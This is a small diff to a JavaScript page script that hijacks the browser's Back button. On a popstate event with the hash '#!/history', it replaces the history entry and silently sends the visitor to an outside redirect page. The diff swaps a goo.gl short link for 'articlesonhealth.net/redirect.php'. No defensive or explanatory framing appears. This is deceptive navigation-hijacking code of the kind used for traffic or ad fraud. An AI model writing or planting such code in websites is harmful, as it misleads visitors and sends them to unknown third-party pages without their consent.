@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("https://goo.gl/dsym1T");
+      location.replace("https://articlesonhealth.net/redirect.php");
     },0);
   }
 }, false);
